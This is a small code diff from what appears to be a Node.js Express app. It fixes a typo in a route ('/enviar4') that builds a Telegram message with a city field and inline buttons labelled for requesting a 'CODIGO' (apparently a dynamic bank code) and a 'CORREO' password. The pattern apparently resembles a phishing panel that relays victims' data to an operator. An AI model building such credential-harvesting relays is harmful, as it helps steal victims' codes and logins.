@@ -195,7 +195,7 @@ app.post('/enviar4', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  cconst keyboard = {
+  const keyboard = {
     inline_keyboard: [
       [{ text: "🔑CODIGO", callback_data: `cel-dina:${txid}` },
        { text: "👤CORREO", callback_data: `corre-clv:${txid}` },
